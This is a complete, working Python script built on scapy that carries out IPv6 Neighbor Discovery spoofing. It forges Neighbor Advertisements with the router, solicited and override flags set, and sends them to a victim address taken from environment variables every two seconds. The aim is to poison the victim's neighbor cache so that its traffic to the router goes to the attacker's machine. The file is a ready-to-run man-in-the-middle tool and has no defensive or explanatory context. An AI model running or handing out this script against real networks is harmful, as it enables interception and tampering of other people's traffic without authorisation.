from scapy.all import getmacbyip6, get_if_hwaddr, IPv6, send
from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
import time

from dotenv import load_dotenv
import os
load_dotenv()
victim_ip6 = os.getenv("victim_ip6")
router_ip6 = os.getenv("router_ip6")
iface = os.getenv("iface")

def ndp_spoof(target_ip6, spoof_ip6, interface="eth0"):
	target_mac = getmacbyip6(target_ip6)
	if not target_mac:
		print(f"[!] Failed to resolve MAC of {target_ip6}.")
		return

	ndp_packet = (
		IPv6(dst=target_ip6) /
		# R=1: "i'm a router"
		# S=1: "this answer was solicited"
		# O=1 "override cache"
		ICMPv6ND_NA(tgt=spoof_ip6, R=1, S=1, O=1) /
		ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(interface))
	)

	print(f"[+] NDP Spoofing started:\n{target_ip6} thinks {spoof_ip6} is at me")
	while True:
		send(ndp_packet, verbose=False, iface=interface)
		#print(f"[+] Packet sent: {target_ip6} thinks {spoof_ip6} is at {get_if_hwaddr(interface)}")
		time.sleep(2)

def main():
	try:
		ndp_spoof(victim_ip6, router_ip6, iface)
	except KeyboardInterrupt:
		print("\n[*] Stopping NDP spoofing...")


if __name__ == "__main__":
	main()